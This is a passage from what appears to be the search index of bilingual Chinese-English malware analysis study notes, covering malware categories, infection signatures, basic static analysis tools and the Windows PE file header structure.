\u800c\u8fd9\u4e24\u79cd\u4e4b\u4e2d\u53c8\u5206\u4e3a\u57fa\u7840\u6280\u672f\u548c\u9ad8\u7ea7\u6280\u672f\uff0c\u9ad8\u7ea7\u6280\u672f\u5c31\u662f\u6307\u9006\u5411\u3001\u8c03\u8bd5\u7b49\u5185\u5bb9\u3002 \u6076\u610f\u4ee3\u7801\u7684\u7c7b\u578b Backdoor\u540e\u95e8 Allows attacker to control the system \u6076\u610f\u4ee3\u7801\u5c06\u81ea\u8eab\u5b89\u88c5\u5230\u4e00\u53f0\u8ba1\u7b97\u673a\u6765\u5141\u8bb8\u653b\u51fb\u8005\u8bbf\u95ee Botnet \u50f5\u5c38\u7f51\u7edc All infected computers receive instructions from the same Command-and-Control (C&C) server \u6240\u6709\u88ab\u540c\u4e00\u4e2a\u50f5\u5c38\u7f51\u7edc\u611f\u67d3\u7684\u8ba1\u7b97\u673a\u5c06\u4f1a\u4ece\u4e00\u53f0\u63a7\u5236\u547d\u4ee4\u670d\u52a1\u5668\u63a5\u6536\u5230\u76f8\u540c\u7684\u547d\u4ee4\uff0c\u5141\u8bb8\u653b\u51fb\u8005\u8bbf\u95ee\u7cfb\u7edf Downloader \u4e0b\u8f7d\u5668 Malicious code that exists only to download other malicious code Used when attacker first gains access \u53ea\u662f\u7528\u6765\u4e0b\u8f7d\u5176\u4ed6\u6076\u610f\u4ee3\u7801\u7684\u6076\u610f\u4ee3\u7801 \u901a\u5e38\u662f\u5728\u653b\u51fb\u8005\u83b7\u5f97\u7cfb\u7edf\u7684\u8bbf\u95ee\u65f6\u9996\u5148\u8fdb\u884c\u5b89\u88c5\u7684 Information-stealing malware \u95f4\u8c0d\u8f6f\u4ef6 Sniffers, keyloggers, password hash grabbers \u4ece\u53d7\u5bb3\u8ba1\u7b97\u673a\u4e0a\u6536\u96c6\u4fe1\u606f\u5e76\u53d1\u9001\u7ed9\u653b\u51fb\u8005 \u6bd4\u5982\uff1a\u55c5\u63a2\u5668\u3001\u5bc6\u7801\u54c8\u5e0c\u91c7\u96c6\u5668\u3001\u952e\u76d8\u8bb0\u5f55\u5668\u7b49\u3002 Launcher \u542f\u52a8\u5668 Malicious program used to launch other malicious programs Often uses nontraditional techniques to ensure stealth or greater access to a system \u7528\u6765\u542f\u52a8\u5176\u4ed6\u6076\u610f\u7a0b\u5e8f\u7684\u6076\u610f\u4ee3\u7801 \u901a\u5e38\u4f7f\u7528\u4e00\u4e9b\u975e\u4f20\u7edf\u7684\u6280\u672f\u6765\u542f\u52a8\u5176\u4ed6\u6076\u610f\u7a0b\u5e8f\uff0c\u4ee5\u786e\u4fdd\u5176\u9690\u853d\u6027\uff0c\u6216\u8005\u4ee5\u66f4\u9ad8\u6743\u9650\u8bbf\u95ee\u7cfb\u7edf\u3002 Rootkit\u5185\u6838\u5957\u4ef6 Malware that conceals the existence of other code Usually paired with a backdoor \u7528\u6765\u9690\u85cf\u5176\u4ed6\u6076\u610f\u4ee3\u7801\u7684\u6076\u610f\u4ee3\u7801 \u901a\u5e38\u662f\u4e0e\u5176\u4ed6\u6076\u610f\u4ee3\u7801\uff08\u5982\u540e\u95e8\uff09\u7ec4\u5408\u6210\u5de5\u5177\u5957\u88c5\uff0c\u6765\u5141\u8bb8\u4e3a\u653b\u51fb\u8005\u63d0\u4f9b\u8fdc\u7a0b\u8bbf\u95ee Scareware \u6050\u5413\u8f6f\u4ef6\uff08\u52d2\u7d22\u8f6f\u4ef6\uff1f\uff09 Frightens user into buying something \u52d2\u7d22\u7528\u6237\u8d2d\u4e70\u67d0\u4e9b\u4e1c\u897f\u7684\u6076\u610f\u4ee3\u7801 \u901a\u5e38\u6709\u4e00\u4e2a\u7528\u6237\u754c\u9762\uff0c\u4f7f\u5f97\u5b83\u770b\u8d77\u6765\u50cf\u662f\u4e00\u4e2a\u6740\u6bd2\u8f6f\u4ef6\u6216\u5176\u4ed6\u5b89\u5168\u7a0b\u5e8f\u3002\u5b83\u4f1a\u901a\u77e5\u7528\u6237\u7cfb\u7edf\u4e2d\u5b58\u5728\u6076\u610f\u4ee3\u7801\uff0c\u800c\u552f\u4e00\u9664\u6389\u5b83\u4eec\u7684\u65b9\u6cd5\u53ea\u6709\u8d2d\u4e70\u4ed6\u4eec\u7684\u201c\u8f6f\u4ef6\u201d\uff0c\u800c\u4e8b\u5b9e\u4e0a\uff0c\u4ed6\u4eec\u6240\u5356\u8f6f\u4ef6\u7684\u5168\u90e8\u529f\u80fd\u53ea\u4e0d\u8fc7\u662f\u5c06\u52d2\u7d22\u8f6f\u4ef6\u8fdb\u884c\u79fb\u9664\u800c\u5df1\u3002 Spam-sending malware \u53d1\u9001\u5783\u573e\u90ae\u4ef6\u7684\u6076\u610f\u4ee3\u7801 Attacker rents machine to spammers \u901a\u8fc7\u4e3a\u653b\u51fb\u8005\u51fa\u552e\u5783\u573e\u90ae\u4ef6\u53d1\u9001\u670d\u52a1\u800c\u83b7\u5f97\u6536\u76ca Worms or viruses \u8815\u866b\u6216\u75c5\u6bd2 Malicious code that can copy itself and infect additional computers \u53ef\u4ee5\u590d\u5236\u81ea\u8eab\u5e76\u611f\u67d3\u5176\u4ed6\u8ba1\u7b97\u673a\u7684\u6076\u610f\u4ee3\u7801 Ransomware \u52d2\u7d22\u8f6f\u4ef6 encrypt victim's data as hostage ask for ransom to recover the data \u5c06\u53d7\u5bb3\u8005\u7684\u6570\u636e\u52a0\u5bc6\u4e3a\u4eba\u8d28 \u52d2\u7d22\u8d22\u7269\u540e\u624d\u6062\u590d\u6570\u636e Mass v. Targeted Malware Mass malware \u5927\u4f17\u6027\u6076\u610f\u4ee3\u7801 Intended to infect as many machines as possible Most common type \u8bbe\u8ba1\u4e3a\u5f71\u54cd\u5230\u5c3d\u53ef\u80fd\u591a\u7684\u673a\u5668 \u6700\u4e3a\u666e\u904d Targeted malware \u9488\u5bf9\u6027\u6076\u610f\u4ee3\u7801 APT(Advanced Persistent Threat)\uff1a\u9ad8\u7ea7\u6301\u7eed\u6027\u5a01\u80c1\uff0c\u672c\u8d28\u662f\u9488\u5bf9\u6027\u653b\u51fb Tailored to a specific target Very difficult to detect, prevent, and remove Requires advanced analysis Ex: Stuxnet \u9488\u5bf9\u7279\u5b9a\u7ec4\u7ec7\u800c\u7814\u5236\u7684 \u5f88\u96be\u68c0\u6d4b\uff0c\u9632\u6b62\u548c\u79fb\u9664 \u9700\u8981\u9ad8\u7ea7\u5206\u6790 \u9707\u7f51\u75c5\u6bd2","title":"ch0"},{"location":"en/MalwareAnalysis/knowledge/ch0/#the-goals-of-malware-analysis","text":"\u786e\u5b9a\u5230\u5e95\u53d1\u751f\u4e86\u4ec0\u4e48 \u786e\u4fdd\u80fd\u591f\u5b9a\u4f4d\u51fa\u6240\u6709\u53d7\u611f\u67d3\u7684\u4e3b\u673a\u548c\u6587\u4ef6 \u89e3\u5228\u53ef\u7591\u6587\u4ef6 \u627e\u51fa\u53ef\u7528\u4e8e\u68c0\u6d4b\u7684\u7279\u5f81\u7801 \u57fa\u4e8e\u673a\u5668\u5b66\u4e60\u6784\u5efa\u68c0\u6d4b\u7cfb\u7edf \u5982\u4f55\u68c0\u6d4b\u5e76\u63a7\u5236\u635f\u5bb3","title":"The Goals of Malware Analysis"},{"location":"en/MalwareAnalysis/knowledge/ch0/#signatures","text":"Identify files or registry keys on a victim computer that indicate an infection Focus on what the malware did to the system, not the malware itself Different from antivirus signatures \u53c8\u79f0\u4e3a\u611f\u67d3\u8ff9\u8c61\uff0c\u7528\u4e8e\u5728\u53d7\u611f\u67d3\u4e3b\u673a\u4e0a\u68c0\u6d4b\u51fa\u6076\u610f\u4ee3\u7801\u3002 \u7ecf\u5e38\u662f\u6076\u610f\u4ee3\u7801\u6240\u521b\u5efa\u6216\u4fee\u6539\u7684\u6587\u4ef6\uff0c\u6216\u662f\u5bf9\u6ce8\u518c\u8868\u7684\u7279\u5b9a\u4fee\u6539\u3002 \u4e0e\u53cd\u75c5\u6bd2\u8f6f\u4ef6\u6240\u4f7f\u7528\u7684\u75c5\u6bd2\u7279\u5f81\u7801\u4e0d\u540c \u6076\u610f\u4ee3\u7801\u7684\u611f\u67d3\u8ff9\u8c61\u5173\u6ce8\u7684\u662f\u6076\u610f\u4ee3\u7801\u5bf9\u7cfb\u7edf\u505a\u4e86\u4ec0\u4e48 \u6076\u610f\u4ee3\u7801\u7684\u75c5\u6bd2\u7279\u5f81\u7801\u5173\u6ce8\u7684\u662f\u6076\u610f\u4ee3\u7801\u672c\u8eab\u7684\u7279\u6027\u3002 \u6709\u65f6\u611f\u67d3\u8ff9\u8c61\u66f4\u52a0\u6709\u6548\uff0c\u6bd4\u5982\u68c0\u6d4b\u90a3\u4e9b\u7ecf\u5e38\u53d8\u5316\u81ea\u8eab\u5f62\u6001\u7684\u591a\u6001\u6027\u6076\u610f\u4ee3\u7801\uff0c\u6216\u8005\u6076\u610f\u4ee3\u7801\u5df2\u7ecf\u5c06\u81ea\u8eab\u6587\u4ef6\u4ece\u786c\u76d8\u4e2d\u5220\u9664\u3002 Network signatures \u57fa\u4e8e\u7f51\u7edc\u7684\u7279\u5f81\u7801 Detect malware by analyzing network traffic More effective when made using malware analysis \u901a\u8fc7\u76d1\u6d4b\u7f51\u7edc\u6d41\u91cf\u6765\u68c0\u6d4b\u6076\u610f\u4ee3\u7801 \u5728\u6076\u610f\u4ee3\u7801\u5206\u6790\u5e2e\u52a9\u4e0b\u63d0\u53d6\u7684\u57fa\u4e8e\u7f51\u7edc\u7684\u7279\u5f81\u7801\u5f80\u5f80\u662f\u66f4\u52a0\u6709\u6548\u7684\uff0c\u6709\u66f4\u9ad8\u7684\u68c0\u6d4b\u7387\u548c\u66f4\u5c11\u7684\u8bef\u62a5","title":"Signatures \u7279\u5f81\u7801"},{"location":"en/MalwareAnalysis/knowledge/ch0/#_1","text":"\u9759\u6001\u3001\u52a8\u6001 \u800c\u8fd9\u4e24\u79cd\u4e4b\u4e2d\u53c8\u5206\u4e3a\u57fa\u7840\u6280\u672f\u548c\u9ad8\u7ea7\u6280\u672f\uff0c\u9ad8\u7ea7\u6280\u672f\u5c31\u662f\u6307\u9006\u5411\u3001\u8c03\u8bd5\u7b49\u5185\u5bb9\u3002","title":"\u4e24\u79cd\u65b9\u6cd5"},{"location":"en/MalwareAnalysis/knowledge/ch0/#_2","text":"Backdoor\u540e\u95e8 Allows attacker to control the system \u6076\u610f\u4ee3\u7801\u5c06\u81ea\u8eab\u5b89\u88c5\u5230\u4e00\u53f0\u8ba1\u7b97\u673a\u6765\u5141\u8bb8\u653b\u51fb\u8005\u8bbf\u95ee Botnet \u50f5\u5c38\u7f51\u7edc All infected computers receive instructions from the same Command-and-Control (C&C) server \u6240\u6709\u88ab\u540c\u4e00\u4e2a\u50f5\u5c38\u7f51\u7edc\u611f\u67d3\u7684\u8ba1\u7b97\u673a\u5c06\u4f1a\u4ece\u4e00\u53f0\u63a7\u5236\u547d\u4ee4\u670d\u52a1\u5668\u63a5\u6536\u5230\u76f8\u540c\u7684\u547d\u4ee4\uff0c\u5141\u8bb8\u653b\u51fb\u8005\u8bbf\u95ee\u7cfb\u7edf Downloader \u4e0b\u8f7d\u5668 Malicious code that exists only to download other malicious code Used when attacker first gains access \u53ea\u662f\u7528\u6765\u4e0b\u8f7d\u5176\u4ed6\u6076\u610f\u4ee3\u7801\u7684\u6076\u610f\u4ee3\u7801 \u901a\u5e38\u662f\u5728\u653b\u51fb\u8005\u83b7\u5f97\u7cfb\u7edf\u7684\u8bbf\u95ee\u65f6\u9996\u5148\u8fdb\u884c\u5b89\u88c5\u7684 Information-stealing malware \u95f4\u8c0d\u8f6f\u4ef6 Sniffers, keyloggers, password hash grabbers \u4ece\u53d7\u5bb3\u8ba1\u7b97\u673a\u4e0a\u6536\u96c6\u4fe1\u606f\u5e76\u53d1\u9001\u7ed9\u653b\u51fb\u8005 \u6bd4\u5982\uff1a\u55c5\u63a2\u5668\u3001\u5bc6\u7801\u54c8\u5e0c\u91c7\u96c6\u5668\u3001\u952e\u76d8\u8bb0\u5f55\u5668\u7b49\u3002 Launcher \u542f\u52a8\u5668 Malicious program used to launch other malicious programs Often uses nontraditional techniques to ensure stealth or greater access to a system \u7528\u6765\u542f\u52a8\u5176\u4ed6\u6076\u610f\u7a0b\u5e8f\u7684\u6076\u610f\u4ee3\u7801 \u901a\u5e38\u4f7f\u7528\u4e00\u4e9b\u975e\u4f20\u7edf\u7684\u6280\u672f\u6765\u542f\u52a8\u5176\u4ed6\u6076\u610f\u7a0b\u5e8f\uff0c\u4ee5\u786e\u4fdd\u5176\u9690\u853d\u6027\uff0c\u6216\u8005\u4ee5\u66f4\u9ad8\u6743\u9650\u8bbf\u95ee\u7cfb\u7edf\u3002 Rootkit\u5185\u6838\u5957\u4ef6 Malware that conceals the existence of other code Usually paired with a backdoor \u7528\u6765\u9690\u85cf\u5176\u4ed6\u6076\u610f\u4ee3\u7801\u7684\u6076\u610f\u4ee3\u7801 \u901a\u5e38\u662f\u4e0e\u5176\u4ed6\u6076\u610f\u4ee3\u7801\uff08\u5982\u540e\u95e8\uff09\u7ec4\u5408\u6210\u5de5\u5177\u5957\u88c5\uff0c\u6765\u5141\u8bb8\u4e3a\u653b\u51fb\u8005\u63d0\u4f9b\u8fdc\u7a0b\u8bbf\u95ee Scareware \u6050\u5413\u8f6f\u4ef6\uff08\u52d2\u7d22\u8f6f\u4ef6\uff1f\uff09 Frightens user into buying something \u52d2\u7d22\u7528\u6237\u8d2d\u4e70\u67d0\u4e9b\u4e1c\u897f\u7684\u6076\u610f\u4ee3\u7801 \u901a\u5e38\u6709\u4e00\u4e2a\u7528\u6237\u754c\u9762\uff0c\u4f7f\u5f97\u5b83\u770b\u8d77\u6765\u50cf\u662f\u4e00\u4e2a\u6740\u6bd2\u8f6f\u4ef6\u6216\u5176\u4ed6\u5b89\u5168\u7a0b\u5e8f\u3002\u5b83\u4f1a\u901a\u77e5\u7528\u6237\u7cfb\u7edf\u4e2d\u5b58\u5728\u6076\u610f\u4ee3\u7801\uff0c\u800c\u552f\u4e00\u9664\u6389\u5b83\u4eec\u7684\u65b9\u6cd5\u53ea\u6709\u8d2d\u4e70\u4ed6\u4eec\u7684\u201c\u8f6f\u4ef6\u201d\uff0c\u800c\u4e8b\u5b9e\u4e0a\uff0c\u4ed6\u4eec\u6240\u5356\u8f6f\u4ef6\u7684\u5168\u90e8\u529f\u80fd\u53ea\u4e0d\u8fc7\u662f\u5c06\u52d2\u7d22\u8f6f\u4ef6\u8fdb\u884c\u79fb\u9664\u800c\u5df1\u3002 Spam-sending malware \u53d1\u9001\u5783\u573e\u90ae\u4ef6\u7684\u6076\u610f\u4ee3\u7801 Attacker rents machine to spammers \u901a\u8fc7\u4e3a\u653b\u51fb\u8005\u51fa\u552e\u5783\u573e\u90ae\u4ef6\u53d1\u9001\u670d\u52a1\u800c\u83b7\u5f97\u6536\u76ca Worms or viruses \u8815\u866b\u6216\u75c5\u6bd2 Malicious code that can copy itself and infect additional computers \u53ef\u4ee5\u590d\u5236\u81ea\u8eab\u5e76\u611f\u67d3\u5176\u4ed6\u8ba1\u7b97\u673a\u7684\u6076\u610f\u4ee3\u7801 Ransomware \u52d2\u7d22\u8f6f\u4ef6 encrypt victim's data as hostage ask for ransom to recover the data \u5c06\u53d7\u5bb3\u8005\u7684\u6570\u636e\u52a0\u5bc6\u4e3a\u4eba\u8d28 \u52d2\u7d22\u8d22\u7269\u540e\u624d\u6062\u590d\u6570\u636e","title":"\u6076\u610f\u4ee3\u7801\u7684\u7c7b\u578b"},{"location":"en/MalwareAnalysis/knowledge/ch0/#mass-v-targeted-malware","text":"Mass malware \u5927\u4f17\u6027\u6076\u610f\u4ee3\u7801 Intended to infect as many machines as possible Most common type \u8bbe\u8ba1\u4e3a\u5f71\u54cd\u5230\u5c3d\u53ef\u80fd\u591a\u7684\u673a\u5668 \u6700\u4e3a\u666e\u904d","title":"Mass v. Targeted Malware"},{"location":"en/MalwareAnalysis/knowledge/ch0/#targeted-malware","text":"APT(Advanced Persistent Threat)\uff1a\u9ad8\u7ea7\u6301\u7eed\u6027\u5a01\u80c1\uff0c\u672c\u8d28\u662f\u9488\u5bf9\u6027\u653b\u51fb Tailored to a specific target Very difficult to detect, prevent, and remove Requires advanced analysis Ex: Stuxnet \u9488\u5bf9\u7279\u5b9a\u7ec4\u7ec7\u800c\u7814\u5236\u7684 \u5f88\u96be\u68c0\u6d4b\uff0c\u9632\u6b62\u548c\u79fb\u9664 \u9700\u8981\u9ad8\u7ea7\u5206\u6790 \u9707\u7f51\u75c5\u6bd2","title":"Targeted malware \u9488\u5bf9\u6027\u6076\u610f\u4ee3\u7801"},{"location":"en/MalwareAnalysis/knowledge/ch1/","text":"\u9759\u6001\u5206\u6790\u6280\u672f\u57fa\u7840 \u53cd\u75c5\u6bd2\u5f15\u64ce \u53ef\u4ee5\u7528\u4e00\u4e9b\u5f00\u6e90\u626b\u63cf\u5f15\u64ce\u5148\u626b\u4e00\u4e0b\u75c5\u6bd2 \u54c8\u5e0c\u503c \u6076\u610f\u4ee3\u7801\u7684\u552f\u4e00\u6807\u8bc6\u3002\u5982\u679c\u5bf9hash\u4e0d\u719f\u6089\uff0c\u8fd9\u91cc\u9700\u8981\u4e00\u4e9b\u5bc6\u7801\u5b66\u7684\u77e5\u8bc6\u3002 \u5de5\u5177\uff1a md5deep \u67e5\u627e\u5b57\u7b26\u4e32 \u5de5\u5177\uff1a strings strings\u4f1a\u5ffd\u7565\u4e0a\u4e0b\u6587\u548c\u683c\u5f0f\uff0c\u4ece\u6574\u4e2a\u6587\u4ef6\u4e2d\u68c0\u6d4b\u51fa\u53ef\u6253\u5370\u5b57\u7b26\u4e32\u3002 unicode\u7f16\u7801 \u8fd9\u91cc\u9700\u8981\u77e5\u9053unicode\u548cascii\u7684\u533a\u522b \u52a0\u58f3 \u52a0\u58f3\u7528\u6765\u9632\u6b62\u6076\u610f\u4ee3\u7801\u88ab\u8f7b\u6613\u5206\u6790\u51fa\u6765\u3002 \u52a0\u58f3\u548c\u6df7\u6dc6\u4ee3\u7801\u901a\u5e38\u5305\u542b LoadLibrary \u548c GetProcAddress \u51fd\u6570\uff0c\u7528\u6765\u52a0\u8f7d\u548c\u4f7f\u7528\u5176\u4ed6\u51fd\u6570\u529f\u80fd \u68c0\u6d4b \u5de5\u5177\uff1a PEiD 2011\u5e74\u505c\u6b62\u652f\u6301\uff0c\u4e0d\u77e5\u9053\u6709\u6ca1\u6709\u65b0\u7684\u5de5\u5177\u3002 PE\u6587\u4ef6\u683c\u5f0f \u672c\u6bb5\u5185\u5bb9\u7531\u7f51\u7edc\u77e5\u8bc6\u641c\u7d22\u800c\u6210\uff0c\u56e0\u4e3aPE\u6587\u4ef6\u975e\u5e38\u91cd\u8981\uff0c\u4e66\u4e0a\u8fd9\u4e00\u70b9\u8bb2\u5f97\u592a\u5c11\uff01 \u57fa\u672c\u4ecb\u7ecd PE\u6587\u4ef6\u662fWindows\u64cd\u4f5c\u7cfb\u7edf\u4e0b\u4f7f\u7528\u7684\u4e00\u79cd\u53ef\u6267\u884c\u6587\u4ef6\uff0c\u7531COFF\uff08UNIX\u5e73\u53f0\u4e0b\u7684\u901a\u7528\u5bf9\u8c61\u6587\u4ef6\u683c\u5f0f\uff09\u683c\u5f0f\u3002 PE\u662f\u201cPortable Executable File Format\u201d\uff08\u53ef\u79fb\u690d\u7684\u6267\u884c\u4f53\uff09\u7684\u7f29\u5199\u3002 PE\u6587\u4ef6\u662f\u6307 32 \u4f4d\u53ef\u6267\u884c\u6587\u4ef6\uff0c\u4e5f\u79f0\u4e3aPE32\u300264\u4f4d\u7684\u53ef\u6267\u884c\u6587\u4ef6\u79f0\u4e3a PE+ \u6216 PE32+\uff0c\u662fPE(PE32)\u7684\u4e00\u79cd\u6269\u5c55\u5f62\u5f0f\uff08\u8bf7\u6ce8\u610f\u4e0d\u662fPE64)\uff0c\u6ca1\u6709\u65b0\u7684\u7ed3\u6784\u52a0\u5165\uff0c\u53ea\u662f\u7b80\u5355\u5730\u5c06\u4ee5\u524d32\u4f4d\u5b57\u6bb5\u6269\u5c55\u621064\u4f4d\u3002\u5bf9\u4e8eC++\u4ee3\u7801\uff0cWindows\u6587\u4ef6\u5934\u7684\u914d\u7f6e\u4f7f\u5176\u62e5\u6709\u4e0d\u660e\u663e\u7684\u533a\u522b\u3002 \u4e8b\u5b9e\u4e0a\uff0c\u4e00\u4e2a\u6587\u4ef6\u662f\u5426\u662f PE \u6587\u4ef6\u4e0e\u5176\u6269\u5c55\u540d\u65e0\u5173\uff0cEXE\u6587\u4ef6\u548cDLL\u6587\u4ef6\u7684\u533a\u522b\u5b8c\u5168\u662f\u8bed\u4e49\u4e0a\u7684\u3002\u5b83\u4eec\u4f7f\u7528\u5b8c\u5168\u76f8\u540c\u7684PE\u683c\u5f0f\uff0c\u552f\u4e00\u7684\u533a\u522b\u5c31\u662f\u7528\u4e00\u4e2a\u5b57\u6bb5\u6807\u8bc6\u51fa\u8fd9\u4e2a\u6587\u4ef6\u662fEXE\u8fd8\u662fDLL\u3002 \u79cd\u7c7b \u79cd\u7c7b \u4e3b\u6269\u5c55\u540d \u53ef\u6267\u884c\u7cfb\u5217 EXE, SCR \u5e93\u7cfb\u5217 DLL, OCX, CPL, DRV \u9a71\u52a8\u7a0b\u5e8f\u7cfb\u5217 SYS, VXD \u5bf9\u8c61\u6587\u4ef6\u7cfb\u5217 OBJ ### \u57fa\u672c\u5f62\u5f0f PE\u6587\u4ef6\u4f7f\u7528\u7684\u662f\u4e00\u4e2a\u5e73\u9762\u5730\u5740\u7a7a\u95f4\uff0c\u6240\u6709\u4ee3\u7801\u548c\u6570\u636e\u90fd\u88ab\u5408\u5e76\u5728\u4e00\u8d77\uff0c\u7ec4\u6210\u4e00\u4e2a\u5f88\u5927\u7684\u7ed3\u6784\u3002\u6587\u4ef6\u7684\u5185\u5bb9\u88ab\u5206\u5272\u4e3a\u4e0d\u540c\u7684\u533a\u5757\uff08Section\uff0c\u53c8\u79f0\u533a\u6bb5\u3001\u8282\u7b49\uff09\uff0c\u533a\u5757\u4e2d\u5305\u542b\u4ee3\u7801\u6216\u6570\u636e\uff0c\u5404\u4e2a\u533a\u5757\u6309\u9875\u8fb9\u754c\u6765\u5bf9\u9f50\uff0c\u533a\u5757\u6ca1\u6709\u5927\u5c0f\u9650\u5236\uff0c\u662f\u4e00\u4e2a\u8fde\u7eed\u7ed3\u6784\u3002\u6bcf\u4e2a\u5757\u90fd\u6709\u5b83\u81ea\u5df1\u5728\u5185\u5b58\u4e2d\u7684\u4e00\u5957\u5c5e\u6027\uff0c\u6bd4\u5982\uff1a\u8fd9\u4e2a\u5757\u662f\u5426\u5305\u542b\u4ee3\u7801\u3001\u662f\u5426\u53ea\u8bfb\u6216\u53ef\u8bfb/\u5199\u7b49\u3002 ### \u5177\u4f53\u7ed3\u6784 1. DOS\u5934 \u662f\u7528\u6765\u517c\u5bb9 MS-DOS \u64cd\u4f5c\u7cfb\u7edf\u7684\uff0c\u76ee\u7684\u662f\u5f53\u8fd9\u4e2a\u6587\u4ef6\u5728 MS-DOS \u4e0a\u8fd0\u884c\u65f6\u63d0\u793a\u4e00\u6bb5\u6587\u5b57\uff0c\u5927\u90e8\u5206\u60c5\u51b5\u4e0b\u662f\uff1aThis program cannot be run in DOS mode. \u8fd8\u6709\u4e00\u4e2a\u76ee\u7684\uff0c\u5c31\u662f\u6307\u660e NT \u5934\u5728\u6587\u4ef6\u4e2d\u7684\u4f4d\u7f6e\u3002 2. NT\u5934 \u5305\u542b windows PE \u6587\u4ef6\u7684\u4e3b\u8981\u4fe1\u606f\uff0c\u5176\u4e2d\u5305\u62ec\u4e00\u4e2a 'PE' \u5b57\u6837\u7684\u7b7e\u540d\uff0cPE\u6587\u4ef6\u5934\uff08IMAGE_FILE_HEADER\uff09\u548c PE\u53ef\u9009\u5934\uff08IMAGE_OPTIONAL_HEADER32\uff09\u3002 3. \u8282\u8868\uff1a\u662f PE \u6587\u4ef6\u540e\u7eed\u8282\u7684\u63cf\u8ff0\uff0cwindows \u6839\u636e\u8282\u8868\u7684\u63cf\u8ff0\u52a0\u8f7d\u6bcf\u4e2a\u8282\u3002 4. \u8282\uff1a\u6bcf\u4e2a\u8282\u5b9e\u9645\u4e0a\u662f\u4e00\u4e2a\u5bb9\u5668\uff0c\u53ef\u4ee5\u5305\u542b \u4ee3\u7801\u3001\u6570\u636e \u7b49\u7b49\uff0c\u6bcf\u4e2a\u8282\u53ef\u4ee5\u6709\u72ec\u7acb\u7684\u5185\u5b58\u6743\u9650\uff0c\u6bd4\u5982\u4ee3\u7801\u8282\u9ed8\u8ba4\u6709\u8bfb/\u6267\u884c\u6743\u9650\uff0c\u8282\u7684\u540d\u5b57\u548c\u6570\u91cf\u53ef\u4ee5\u81ea\u5df1\u5b9a\u4e49\uff0c\u672a\u5fc5\u662f\u4e0a\u56fe\u4e2d\u7684\u4e09\u4e2a\u3002 RVA VA \u76f8\u5bf9\u865a\u62df\u5730\u5740RVA\u4e0e\u865a\u62df\u5730\u5740VA \u5f53\u4e00\u4e2a PE \u6587\u4ef6\u88ab\u52a0\u8f7d\u5230\u5185\u5b58\u4e2d\u4ee5\u540e\uff0c\u6211\u4eec\u79f0\u4e4b\u4e3a \" \u6620\u8c61 \"\uff08image\uff09\uff0c\u4e00\u822c\u6765\u8bf4\uff0cPE\u6587\u4ef6\u5728\u786c\u76d8\u4e0a\u548c\u5728\u5185\u5b58\u91cc\u662f\u4e0d\u5b8c\u5168\u4e00\u6837\u7684\uff0c\u88ab\u52a0\u8f7d\u5230\u5185\u5b58\u4ee5\u540e\u5176\u5360\u7528\u7684\u865a\u62df\u5730\u5740\u7a7a\u95f4\u8981\u6bd4\u5728\u786c\u76d8\u4e0a\u5360\u7528\u7684\u7a7a\u95f4\u5927\u4e00\u4e9b\uff0c\u8fd9\u662f\u56e0\u4e3a\u5404\u4e2a\u8282\u5728\u786c\u76d8\u4e0a\u662f\u8fde\u7eed\u7684\uff0c\u800c\u5728\u5185\u5b58\u4e2d\u662f\u6309\u9875\u5bf9\u9f50\u7684\uff0c\u6240\u4ee5\u52a0\u8f7d\u5230\u5185\u5b58\u4ee5\u540e\u8282\u4e4b\u95f4\u4f1a\u51fa\u73b0\u4e00\u4e9b \u201c\u7a7a\u6d1e\u201d \u3002 \u56e0\u4e3a\u5b58\u5728\u8fd9\u79cd\u5bf9\u9f50\uff0c\u6240\u4ee5\u5728 PE \u7ed3\u6784\u5185\u90e8\uff0c\u8868\u793a\u67d0\u4e2a\u4f4d\u7f6e\u7684\u5730\u5740\u91c7\u7528\u4e86\u4e24\u79cd\u65b9\u5f0f\uff1a \u9488\u5bf9\u5728\u786c\u76d8\u4e0a\u5b58\u50a8\u6587\u4ef6\u4e2d\u7684\u5730\u5740\uff0c\u79f0\u4e3a \u539f\u59cb\u5b58\u50a8\u5730\u5740 \u6216 \u7269\u7406\u5730\u5740\uff0c\u8868\u793a \u8ddd\u79bb\u6587\u4ef6\u5934\u7684\u504f\u79fb\u3002 \u9488\u5bf9\u52a0\u8f7d\u5230\u5185\u5b58\u4ee5\u540e\u6620\u8c61\u4e2d\u7684\u5730\u5740\uff0c\u79f0\u4e3a \u76f8\u5bf9\u865a\u62df\u5730\u5740\uff08RVA\uff09\uff0c\u8868\u793a\u76f8\u5bf9\u5185\u5b58\u6620\u8c61\u5934\u7684\u504f\u79fb\u3002 \u8fd9\u91cc\u9700\u8981\u77e5\u9053\u7684\u662fRVA=VA-ImageBase \u7ed3\u6784 DOS\u5934 \u7531MZ\u5934\u548cDOS\u5b58\u6839\u7ec4\u6210 MZ \u5934\u90e8\u662f\u771f\u6b63\u7684DOS\u5934\u90e8\uff0c\u7531\u4e8e\u5176\u5f00\u59cb\u5904\u7684\u4e24\u4e2a\u5b57\u8282\u4e3a\u201cMZ\u201d\uff0c\u56e0\u6b64DOS\u5934\u4e5f\u53ef\u4ee5\u53eb\u4f5cMZ\u5934\u3002\u8be5\u90e8\u5206\u7528\u4e8e\u7a0b\u5e8f\u5728DOS\u7cfb\u7edf\u4e0b\u52a0\u8f7d\uff0c\u5b83\u7684\u7ed3\u6784\u88ab\u5b9a\u4e49\u4e3aIMAGE_DOS_HEADER\u3002 \u5176\u4e2d\uff0c\u503c\u5f97\u6ce8\u610f\u7684\u662fe_magic\u5b57\u6bb5\u548ce_lfanew\u5b57\u6bb5 e_magic\u5b57\u6bb5\u5360\u4e24\u4e2a\u5b57\u8282\uff0c\u503c\u4e3a 0x5A4D \uff0c\u5bf9\u5e94ASCII\u7801\u503c\u4e3a 'MZ' \uff0c\"MZ\"\u5176\u5b9e\u662fMS-DOS\u7684\u521b\u5efa\u8005\u4e4b\u4e00Mark Zbikowski\u540d\u5b57\u7684\u7f29\u5199\u3002 e_lfanew\u5b57\u6bb5\u53604\u4e2a\u5b57\u8282\uff0c\u4f4d\u4e8e\u4ece\u6587\u4ef6\u5f00\u59cb\u504f\u79fb 3Ch \u5b57\u8282\u5904\uff0c\u7528\u4e8e\u6307\u51faNT\u5934\u7684\u504f\u79fb\u5730\u5740 typedef struct _IMAGE_DOS_HEADER { WORD e_magic; //\u9b54\u672f\u6570\u5b57 WORD e_cblp; //\u6587\u4ef6\u6700\u540e\u9875\u7684\u5b57\u8282\u6570 WORD e_cp; //\u6587\u4ef6\u9875\u6570 WORD e_crlc; //\u91cd\u5b9a\u4e49\u5143\u7d20\u4e2a\u6570 WORD e_cparhdr; //\u5934\u90e8\u5c3a\u5bf8\uff0c\u4ee5\u6bb5\u843d\u4e3a\u5355\u4f4d WORD e_minalloc; 